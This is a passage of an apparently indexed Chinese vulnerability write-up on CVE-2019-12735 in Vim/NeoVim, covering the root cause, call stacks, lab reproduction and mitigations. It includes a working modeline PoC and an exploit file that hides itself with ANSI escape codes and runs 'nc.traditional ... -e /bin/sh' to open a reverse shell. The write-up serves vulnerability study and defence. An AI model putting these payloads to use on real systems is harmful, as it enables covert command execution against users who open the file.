55824)\npwd\n/home/invincible/Desktop/test/vim_test\nid\nuid=1000(invincible) gid=1000(invincible) groups=1000(invincible),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n\n\n\n\n\n\nd. \u5229\u7528\u6838\u5fc3\u8981\u7d20\n\n\n\n\n\n\nVim\u7684modeline\u53ef\u4ee5\u5728\u6587\u4ef6\u52a0\u8f7d\u65f6\u81ea\u52a8\u914d\u7f6e\uff1b\n\n\n\n\n\n\nVim\u8fdb\u884c\u914d\u7f6e\u65f6\u4f1a\u6267\u884cVim\u6307\u4ee4\uff0c\u800cVim\u7684\u67d0\u4e9b\u6307\u4ee4\u53c8\u80fd\u591f\u6267\u884c\u7cfb\u7edf\u7684Shell\u6307\u4ee4(\u901a\u8fc7\nfork+execvp/system\n)\uff1b\n\n\n\n\n\n\nVim\u7684\u5bf9\u53ef\u6267\u884c\u6307\u4ee4\u7684\u6761\u4ef6\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u3002\n\n\n\n\n\n\n5.\u9632\u62a4\u5efa\u8bae\n\n\n\n\n\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\npackage\u7248\u672c\u68c0\u67e5\uff1a\u83b7\u53d6\u5f53\u524d\u7cfb\u7edfvim\u7684package\u7248\u672c\u4fe1\u606f\uff0c\u5bf9\u6bd4package\u7684changelog\u5224\u65ad\u5f53\u524d\u7248\u672c\u662f\u5426\u4fee\u590d\u4e86\u6f0f\u6d1e(\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u53ef\u80fd\u5b58\u5728\u65e0\u6cd5\u83b7\u53d6package\u4fe1\u606f\u7684\u60c5\u51b5)\u5177\u4f53\u64cd\u4f5c\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4->package\u7248\u672c\u68c0\u67e5\u90e8\u5206\n\n\npoc\u9a8c\u8bc1\uff1a\u624b\u52a8\u9a8c\u8bc1\uff0c\u4ee3\u7801\u6267\u884cvim\u8bfb\u53d6stdout\uff0c\u6216\u8005ptrace\u8bfb\u53d6\u8c03\u7528\u6808\u3002\u5177\u4f53\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4-> poc\u9a8c\u8bc1\u90e8\u5206\u3002\n\n\n\n\n\n\n\u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n\u66f4\u65b0\u8f6f\u4ef6\uff0c\u8fd9\u662f\u6700\u7b80\u5355\u901a\u7528\u7684\u65b9\u6cd5\uff1b\n\n\n\u914d\u7f6e\u68c0\u67e5\uff0cDebian\u7b49\u4e00\u4e9b\u53d1\u884c\u7248\u5df2\u7ecf\u9ed8\u8ba4\u5173\u95ed\u4e86modeline\u7684\u914d\u7f6e\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u5168\u9694\u65ad\u8be5\u6f0f\u6d1e\u7684\u5229\u7528\u8def\u5f84\uff0c\u5982\u679c\u9ed8\u8ba4\u6ca1\u6709\u5173\u95ed\uff0c\u5219\u9700\u8981\u624b\u52a8\u5173\u95ed\uff0c\u5177\u4f53\u914d\u7f6e\u65b9\u6cd5\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4-> \u914d\u7f6e\u68c0\u67e5\u90e8\u5206\uff1b\n\n\n\u6587\u4ef6\u76d1\u63a7\uff0c\u5339\u914d\u6587\u4ef6\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u662f\u5426\u7b26\u5408modeline\u7279\u5f81\uff0c\u5982\u679c\u7b26\u5408\uff0c\u4e14modeline\u4e2d\u5305\u542b\"source\"\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u53d1\u51fa\u8b66\u62a5(\u975e\u901a\u7528\u65b9\u6cd5\uff0c\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002\n\n\n\n\n\n\n\u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n\u4ec5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u901a\u7528\u7f13\u89e3\u63aa\u65bd\u5c31\u662f\u5173\u95edmodeline\u914d\u7f6e\uff1b\n\n\n\u8be5\u7c7b\u6f0f\u6d1e\u5c5e\u4e8eOS\u547d\u4ee4\u6ce8\u5165\uff0c\u4e00\u822c\u662f\u901a\u8fc7\u76d1\u63a7system/fork/exec\u7b49\u7cfb\u7edf\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u548c\u963b\u65ad\u5a01\u80c1(\u4f46\u662f\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002\n\n\n\n\n\n\n\n\n6.\u53c2\u8003\n\n\nhttps://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md\n\n\nhttps://imbawenzi.github.io/2019/08/03/vim/",
            "title": "Cve 2019 12735 \u5206\u6790"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#vim-modelinecve-2019-12735",
            "text": "",
            "title": "Vim modeline\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790(cve-2019-12735)"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#0",
            "text": "invincible1944@gmail.com",
            "title": "0.\u4f5c\u8005"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#1",
            "text": "\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6\uff1aVim/NeoVim     Vim/NeoVim \u7b80\u4ecb   Vim\u662f\u4ecevi\u53d1\u5c55\u51fa\u6765\u7684\u4e00\u4e2a\u6587\u672c\u7f16\u8f91\u5668\uff0c\u662fLinux \u5e73\u53f0\u6700\u5e38\u7528\u7684\u7f16\u8f91\u5668\u4e4b\u4e00\u3002   Neovim \u662fVim\u7684\u4e00\u4e2a\u91cd\u6784\u7248\u672c\uff0c\u81f4\u529b\u4e8e\u6210\u4e3aVim\u7684\u8d85\u96c6\uff08superset\uff09\uff0c    Neovim\u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u57282015\u5e7412\u6708\u53d1\u884c\uff0c\u5e76\u4e14\u80fd\u591f\u5b8c\u5168\u517c\u5bb9Vim\u7684\u7279\u6027\u3002     \u76f8\u6bd4\u4e8eVim\uff0cNeovim\u7684\u4e3b\u8981\u6539\u8fdb\u5728\u4e8e\u5176\u652f\u6301\u5f02\u6b65\u52a0\u8f7d\u63d2\u4ef6\u3002      \u6f0f\u6d1e\u5371\u5bb3\uff1a\u6253\u5f00\u6076\u610f\u6784\u9020\u7684\u6587\u672c\u6587\u4ef6\uff0c\u53ef\u4ee5\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u5f53\u524d\u7528\u6237\u6743\u9650\u3002    \u76f8\u5173\u80cc\u666f\u77e5\u8bc6\uff1a\u89c1\u9644\u4ef6\uff0ccve-2019-12735-01",
            "title": "1.\u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#2",
            "text": "\u6f0f\u6d1e\u539f\u7406\uff1a\n    Vim \u7684sandbox\u5bf9\u8f93\u5165\u7684\u547d\u4ee4\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u901a\u8fc7source\u547d\u4ee4\u52a0\u8f7d\u5176\u4ed6Vim\u811a\u672c\u7ed5\u8fc7\u6c99\u7bb1\u6267\u884c\uff0c\u914d\u5408\u4e0amodeline\u7279\u6027\uff0c\u53ef\u4ee5\u5728Vim\u6253\u5f00\u666e\u901a\u6587\u4ef6\u65f6\u5b9e\u73b0OS command injection\u3002    \u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c    \u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1a Vim <= 8.1.1365/ NeoVim  <= 0.3.6    \u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a Vim 81/src/getchar.c -> openscript    Vim\u5b98\u7f51    Vim\u6e90\u7801\u5e93      \u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\uff1a CWE-78 OS Command Injection    \u6f0f\u6d1e\u8865\u4e01\uff1a Vim patch    \u6f0f\u6d1eCVE\u53f7\uff1a CVE-2019-12735",
            "title": "2.\u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#3-poc",
            "text": "",
            "title": "3. POC"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#a-poc",
            "text": "\u80cc\u666f\u7b80\u4ecb   Vim\u53ef\u4ee5\u901a\u8fc7Vim\u811a\u672c\u7f16\u5199\u63d2\u4ef6\uff0c\u901a\u8fc7 source[!] \u547d\u4ee4\u52a0\u8f7d\u548c\u6267\u884c\u811a\u672c  Vim\u652f\u6301\u901a\u8fc7Vim command\u6216\u8005Vim\u811a\u672c\u6267\u884cshell\u6307\u4ee4  vim\u652f\u6301\u901a\u8fc7\u8868\u8fbe\u5f0f(\u53ef\u4ee5\u7406\u89e3\u4e3a\u77ed\u811a\u672c)\u5bf9\u6587\u672c\u8fdb\u884c\u8bbe\u7f6e(\u6bd4\u5982folding\u4ee3\u7801\u5757\u6298\u53e0\u663e\u793a\u529f\u80fd)  \u8868\u8fbe\u5f0f\u652f\u6301Vim\u6307\u4ee4\uff0c\u4f46\u662f\u4f1a\u5728\u81ea\u5df1\u7684sandbox\u6267\u884c\uff0c\u53ea\u8f93\u51fa\u6267\u884c\u7ed3\u679c  Vim\u8868\u8fbe\u5f0f\u4e2d\u5b58\u5728\u4e00\u4e9b\u81ea\u5e26\u7684\u51fd\u6570 execute, assert_fails \u7b49\uff0c\u53ef\u4ee5\u5c06Vim command\u4f5c\u4e3a\u53c2\u6570\u6267\u884c\u3002  \u7531\u4e8e\u9650\u5236\u4e0d\u4e25\u683c\uff0c\u5f53\u8868\u8fbe\u5f0f\u901a\u8fc7execute, assert_fails\u8fd9\u7c7b\u51fd\u6570\u6267\u884csource\u547d\u4ee4\u65f6\uff0c\u4f1a\u5728sandbox\u4e2d\u6267\u884c\uff0c\u4f46\u662fsource \u52a0\u8f7d\u7684Vim\u811a\u672c\u5219\u4f1a\u5728\u6b63\u5e38\u8fdb\u7a0b\u73af\u5883\u4e2d\u6267\u884c  Vim\u7684modeline\u529f\u80fd\u662f\u7528\u4e8e\u5bf9\u5355\u4e2a\u6587\u4ef6\u8fdb\u884c\u81ea\u52a8\u914d\u7f6e\u7684\uff0c\u5e76\u4e14\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5e26\u6709\u8868\u8fbe\u5f0f\u7684\u914d\u7f6e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5229\u7528\u6b64\u7279\u6027\u5728Vim\u6253\u5f00\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u6587\u672c\u65f6\u5b9e\u73b0OS command injection.     Poc\u539f\u7406  \u8981\u7406\u89e3Poc\u7684\u539f\u7406\uff0c\u9700\u8981\u6709\u4e00\u4e9bVim\u76f8\u5173\u7684\u80cc\u666f\u77e5\u8bc6\uff0c\u89c1\u9644\u4ef6: cve-2019-12735-01  \u4e0b\u9762\ud83d\udc47\u662fPoc\u7684\u6d41\u7a0b\uff1a    vim \u6253\u5f00poc\u6587\u4ef6\uff0c\u8bc6\u522b\u51fa\u6587\u4ef6\u9996\u90e8\u7684modeline    \u8df3\u8fc7\u5f00\u5934\u7684text\uff0c\u4ece \"vi:\" \u540e\u9762\u5f00\u59cb\u4f9d\u6b21\u52a0\u8f7d\u914d\u7f6e\u9009\u9879    \u52a0\u8f7d\u5230fde\u9009\u9879\u65f6\uff0c\u6267\u884c\u8868\u8fbe\u5f0f\u4e2d\u7684 assert_fails \u51fd\u6570\uff0c\u8fdb\u800c\u6267\u884c source! % \u6307\u4ee4    source! % \u5c06\u5f53\u524d\u6587\u4ef6\u4f5c\u4e3aVim\u811a\u672c\u52a0\u8f7d\u5e76\u6267\u884c    Vim\u811a\u672c\u7684\u5185\u5bb9\u5c31\u662fPoc\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6b21\u4e0e\u76f4\u63a5\u6253\u5f00\u4e0d\u540c\uff0c\u662f\u4f5c\u4e3a\u811a\u672c\u52a0\u8f7d\uff0c\u6240\u4ee5\u6587\u4ef6\u5185\u5bb9\u4e0d\u4f1a\u88ab\u8bc6\u522b\u4e3amodeline\uff0c\u800c\u662f\u8bc6\u522b\u4e3aVim\u811a\u672c\uff0c\u5177\u4f53\u542b\u4e49\u662f\u6267\u884cshell\u547d\u4ee4 uname -a || \"some text\" \uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c      \u8c03\u7528\u6808\u4fe1\u606f    #0  openscript (\n    name=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \n    directly=0x0) at getchar.c:1415\n#1  0x000000000046e06f in cmd_source (\n    fname=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \n    eap=0x7fffffffc5c0) at ex_cmds2.c:3502\n#2  0x000000000046dfd8 in ex_source (eap=0x7fffffffc5c0) at ex_cmds2.c:3484\n...\n#4  0x0000000000470d89 in do_cmdline (cmdline=0x87ea80 \"source! %\", \n...\n#7  0x00000000004395ec in call_func (\n    funcname=0x884d40 \"assert_fails(\\\"source! %\\\")\", len=0xc, \n...\n#9  0x00000000004337f8 in eval7 (arg=0x7fffffffd680, rettv=0x7fffffffd6c0, \n...\n#16 0x000000000043189b in eval0 (arg=0x884d40 \"assert_fails(\\\"source! %\\\")\", \n#17 0x000000000042cc06 in eval_foldexpr (\n    arg=0x884d40 \"assert_fails(\\\"source! %\\\")\", cp=0x7fffffffd70c)\n#18 0x00000000004a8403 in foldlevelExpr (flp=0x7fffffffd7b0) at fold.c:3032\n...\n#26 0x000000000040e02f in chk_modeline (lnum=0x1, flags=0x0) at buffer.c:5234\n#27 0x000000000040dba6 in do_modelines (flags=0x0) at buffer.c:5115\n...\n#30 0x00000000005e8db0 in main (argc=0x2, argv=0x7fffffffde98) at main.c:881\n...",
            "title": "a. POC\u539f\u7406"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#bpoc",
            "text": "$ echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n$ cat poc.txt \n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n$vim poc.txt",
            "title": "b.POC\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#c",
            "text": "\u590d\u73b0\u73af\u5883    \u73af\u5883\u6e05\u5355   \u7cfb\u7edf\u7248\u672c: Ubuntu-16.04.6 LTS (Xenial Xerus)  Vim\u7248\u672c: VIM - Vi IMproved 7.4   Vim package \u7248\u672c:  2:7.4.1689-3ubuntu1  \u955c\u50cf\u4e0b\u8f7d\u5730\u5740: https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/14.04.6/ubuntu-14.04.6-desktop-amd64.iso     QEMU\u865a\u62df\u673a\u642d\u5efa\u6b65\u9aa4\uff1a      #  \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n$ qemu-img create -f qcow2 ubuntu16.04.6.img 10G\n\n# \u5b89\u88c5\u865a\u62df\u673a\n$ qemu-system-x86_64  -m 2048 -hda ubuntu16.04.6.img -cdrom ./ubuntu-16.04.6-desktop-amd64.iso\n\n# \u542f\u52a8\u865a\u62df\u673a\n$ qemu-system-x86_64 -m 2048  ubuntu16.04.6.img   Step1 - \u5b89\u88c5nc.traditional \n    \u5efa\u7acb\u4f1a\u8bdd\u7684\u65b9\u5f0f\u5f88\u591a\uff0c\u8fd9\u4e00\u6b65\u53ea\u662f\u4e3a\u4e86\u6f14\u793aexp\u9700\u8981\u3002   sudo apt-get install netcat-traditional   Step2 - \u5b89\u88c5\u542b\u6f0f\u6d1e\u7248\u672c\u7684Vim   $ sudo apt-get install vim-runtime=2:7.4.1689-3ubuntu1\n$ sudo apt-get install vim-common=2:7.4.1689-3ubuntu1\n$ sudo apt-get install vim=2:7.4.1689-3ubuntu1   Step3 - \u68c0\u67e5Vim\u914d\u7f6e\u662f\u5426\u5f00\u542fmodeline\uff0c\u82e5\u6ca1\u6709\u5219\u914d\u7f6eVim   # \u68c0\u67e5modeline\u914d\u7f6e\nvim\n:verbose set modeline? set modelines?\n# \u5982\u679c\u663e\u793anomodeline\u6216\u8005nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e\n\n# \u914d\u7f6e\u65b9\u6cd5\uff1a\nvim ~/.vimrc\ni\nset modeline\nset modelines=5\n<ESC>\n:wq   Step4 - \u521b\u5efapoc\u6587\u4ef6   echo \"G1s/OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n\n# base64\u7f16\u7801\u660e\u6587\uff1a\n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\\n   Step5 - \u7528vim\u6253\u5f00\u89e6\u53d1\u547d\u4ee4\u6267\u884c (uname -a)   $ vim poc.txt \n\nLinux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n\nPress ENTER or type command to continue",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#4-exp",
            "text": "",
            "title": "4. EXP"
        },
        {
            "location": "/userspace/cve-2019-12735-\u5206\u6790/#a-exp",
            "text": "Exp\u662f\u4e00\u6761\u7cbe\u5fc3\u6784\u9020\u7684modeline\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u628a\u6076\u610f\u6587\u4ef6\u4f2a\u9020\u6210\u6b63\u5e38\u6587\u672c\uff0c\u6d88\u9664\u75d5\u8ff9\uff1b     \u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97Vim\uff0c\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u9690\u85cf\u6076\u610f\u6587\u672c\u5185\u5bb9\uff1b    \u53e6\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97cat\uff0c\u4f7f\u6587\u672c\u6253\u5f00\u65f6\u770b\u8d77\u6765\u662f\u6b63\u5e38\u6587\u672c\uff1b    \u4e3b\u8981\u901a\u8fc7ANSI Escape Code\u6765\u5b9e\u73b0\u8fd9\u4e9b\u9690\u85cf\u529f\u80fd\u3002    Vim\u52a0\u8f7dexp\u6587\u4ef6\u540e\u7b49\u540c\u4e8e\u6267\u884c\u4e0b\u9762\u7684\u5e8f\u5217\uff1a  # modeline\u89e6\u53d1\u6267\u884c\u81ea\u52a8\u914d\u7f6e\n:set fen\n:set fdm=expr\n:set fde=assert_fails('set\\ fde=x\\ \\|\\ source\\!\\ \\%')\n:set fdl=0\n\n# fde=assert_fails\u89e6\u53d1\u4e86assert_fails\u51fd\u6570\u8c03\u7528\n:call assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\')\n\n# assert_fails\u51fd\u6570\u6267\u884cvim\u547d\u4ee4\n:set fde=x | source! %\n\n# source! % \u52a0\u8f7d\u5f53\u524d\u6587\u4ef6\uff0c\u5e76\u89c6\u4e3aVim Ex mode\u4e0b\u7684\u811a\u672c\u6267\u884c\uff1a\n<ESC>\nS\nNothing here.\n<ESC>\n:silent! w\n:call system('nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &') \n:redraw! \n:file \n:silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[KNothing here.\"\\x16\\x1b[D \\n\n\n# \u8bfb\u53d6\u5230\u6362\u884c\u7b26\u53f7\u540e\\n\u6267\u884c\u4e0a\u9762\u7b2c\u4e00\u4e2asilent!\u4ee5\u53ca\u540e\u9762\u7684\u547d\u4ee4\n# \u901a\u8fc7vim\u7684system\u51fd\u6570\u6267\u884c\u4e86\u7cfb\u7edf\u547d\u4ee4,\u5efa\u7acb\u53cd\u5f39shell  \u9010\u6761\u89e3\u91ca\uff1a  # exp.txt: \n\\x1b[?7l\\x1bSNothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n\n\n# \u4e0b\u6587\u62ec\u53f7\u4e2d\u7684c\u8868\u793a\u7528\u4e8e\u6b3a\u9a97cat\uff0cv\u8868\u793aVim\u811a\u672c\u6b63\u5e38\u6307\u4ee4\n\n\\x1b[?7l (c)\n# \u5173\u95ed\u81ea\u52a8\u6362\u884c\n# \u914d\u5408\\x1b[1G\u548c\\x1b[K\u4f7f\u7528\uff0c\u89c1\u4e0b\u6587\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206\n\n\\x1bS (v)\n# <ESC>S \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\u548cS\u952e\n# \u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u4eceNormal mode\u5207\u6362\u5230Insert mode\n# \u7ecf\u6d4b\u8bd5\uff0c\u8fd9\u91cc\u7684\\x1b\u662f\u53ef\u4ee5\u53bb\u6389\u7684\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206\n\nNothing here. (v)\n# \u5728Insert mode\u4e0b\u5199\u5165\u5b57\u7b26\u4e32 Nothing here.\n\n\\x1b (v)\n# \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\uff0c\u9000\u51faInsert mode \u8fd4\u56deNormal mode\n\n:  (v)\n# \u4eceNormal mode\u8fdb\u5165Command-line mode\n\nsilent! w (v)\n# \u4fdd\u5b58\u5199\u5165\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u5173\u95ed\u56de\u663e\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n| call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') (v)\n# \u8c03\u7528system \u51fd\u6570\u6267\u884cShell\u547d\u4ee4\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n| redraw! (v)\n# \u6e05\u9664\u56de\u663e\u4fe1\u606f\n# \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206\n\n| file | silent! [some text] (v)\n# \u663e\u793a\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\uff0csilent!\u7528\u4e8e\u6e05\u9664\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4ea7\u751f\u7684\u62a5\u9519\u4fe1\u606f\n# \u6700\u540e\u7684\u6548\u679c\u5c31\u662f\u5c4f\u5e55\u5e95\u90e8\u663e\u793a\u7684\u662ffile\u7684\u6267\u884c\u7ed3\u679c\n\nvim: set fen fdm=expr fde=assert_fails(\\'set\\\\ fde=x\\\\ \\\\|\\\\ source\\\\!\\\\ \\\\%\\') fdl=0: (v)\n# vim\u52a0\u8f7d\u65f6modeline\u7684\u6b63\u6587\u90e8\u5206\n# fen foldenable, \u5f00\u542f\u4ee3\u7801\u6298\u53e0folding\u529f\u80fd\n# fdm foldmethod, \u8bbe\u7f6efolding\u65b9\u6cd5\u4e3aexpr\n# fde foldexpr, \u8bbe\u7f6efold expression\n# assert_fails Vim\u7684\u5185\u90e8\u51fd\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684vim\u547d\u4ee4\uff0c\u5177\u4f53\u89c1\u9644\u4ef6\n# \u6b64\u5904\u6267\u884c\u4e86\u4e24\u4e2a\u547d\u4ee4\uff1a\n# set fde \u628afoldexpr\u8bbe\u7f6e\u4e3ax(\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u4e3a\u65e0\u6548)\n# source % \u628a\u5f53\u524d\u6587\u4ef6\u89c6\u4e3avim\u811a\u672c\uff0c\u52a0\u8f7d\u5e76\u6267\u884c\n# fdl foldlevel \u8bbe\u7f6e\u4e3a0\u8868\u793a\u6240\u6709\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u90fd\u6298\u53e0\u663e\u793a(\u4e0eexp\u65e0\u5173)\n\n\\x16 (v) \n# \u8fd9\u4e2a\u5f88\u5173\u952e\uff0c\u7531\u4e8e\u662f\u7528source! %\u6253\u5f00\uff0c\u6240\u4ee5\u6587\u672c\u7684\u5185\u5bb9\u90fd\u4f1a\u8bc6\u522b\u6210\u5728Normal mode\u4e0b\u7684\u8f93\u5165\uff0c\u6bd4\u5982\\x1b\u5c31\u662f\u6309\u4e0b<ESC>, S\u5c31\u4ee3\u8868\u6309\u4e0b\u952e\u76d8(shift+s)\uff0c\u800c\u5f53\u6267\u884c\u5230\u7b2c\u4e8c\u4e2asilent! \u4e4b\u540e\uff0c\u540e\u9762\u7684\u5b57\u7b26\u4e32\u76f4\u5230'\\n'\u6211\u4eec\u5e0c\u671b\u5b83\u4eec\u88ab\u5ffd\u7565\uff0c\u4f46\u662f\u4e3a\u4e86\u6784\u9020cat\u7684\u8f93\u51fa, \u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e86\u5f88\u591aescape code\u6bd4\u5982\\x1b[D, \u4f46\u662f\u8fd9\u4e9b\u4e5f\u4f1a\u88ab\u8bc6\u522b\u6210\u952e\u76d8\u7684\u6309\u952e\u64cd\u4f5c\uff0c\u5bfc\u81f4\u6574\u4e2a\u6307\u4ee4\u90fd\u65e0\u6cd5\u6267\u884c \u800c\\x16\u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u4f1a\u628a\u4e0b\u4e00\u4e2a\u6309\u952e\u89e3\u6790\u6210\u5b57\u7b26\u800c\u4e0d\u4f1a\u8ba9\u5b83\u6267\u884c\u6309\u952e\u529f\u80fd\uff0c\u5177\u4f53\u5206\u6790\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\n\\x1b[1G (c)\n# cat\u6253\u5f00\u65f6\u5019\uff0c\u5c06\u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u9996\u90e8\n# \u914d\u5408\\x1b[K\u548c\\x1b[?7l\uff0c\u89c1\u4e0b\u6587\n# \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n\\x16 (v)\n# \u4f5c\u7528\u540c\u4e0a\n\n\\x1b[2K (c)\n# \u914d\u5408\\x1b[1G\u548c\\x1b[?7l\uff0c\u5220\u9664\u5f53\u524d\u4f4d\u7f6e\u5230\u884c\u9996\u7684\u5185\u5bb9(\u4e0d\u4f1a\u6539\u53d8\u6587\u672c\uff0c\u53ea\u6539\u53d8\u8f93\u51fa\u5185\u5bb9)\n# \u7ecf\u8fc7\u8fd9\u4e2a\u5904\u7406\uff0ccat\u7684\u67e5\u770b\u7ed3\u679c\u5c31\u53ea\u5269\u4e0b\u540e\u9762\u7684\u4fe1\u606f\u4e86\n# \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\nNothing here.\" (c)\n# \u51c6\u5907\u8ba9cat\u67e5\u770b\u6587\u4ef6\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\uff0c\u4e0eVim\u6253\u5f00\u6587\u4ef6\u65f6\u67e5\u770b\u5230\u7684\u5185\u5bb9\u76f8\u540c\n\n\\x16 (v)\n# \u4f5c\u7528\u540c\u4e0a\n\n\\x1b[2D (c) \n# \u5149\u6807\u5411\u524d\u79fb\u52a82\u4f4d\n# \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002\n\n  \\n (c&v)\n# 